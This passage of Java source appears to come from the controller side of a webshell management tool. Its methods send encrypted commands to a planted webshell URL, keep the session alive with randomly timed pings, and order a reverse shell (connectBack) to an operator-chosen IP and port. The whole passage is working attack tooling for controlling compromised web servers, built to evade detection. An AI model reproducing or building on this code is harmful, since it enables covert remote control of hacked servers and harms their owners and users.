    public String getBasicInfo() throws Exception {
        String result = "";
        Map<String, String> params = new LinkedHashMap<String, String>();
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);

        byte[] resData = (byte[]) resultObj.get("data");

        try {
            result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        } catch (Exception e) {

            e.printStackTrace();
            throw new Exception("Request failed:" + new String(resData, "UTF-8"));
        }
        return result;
    }


    public void keepAlive() throws Exception {
        while (true) {
            try {
                while (true) {
                    Thread.sleep(((new Random().nextInt(5) + 5) * 60 * 1000));
                    getBasicInfo();
                }
                // break;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public JSONObject connectBack(String type, String ip, String port) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
}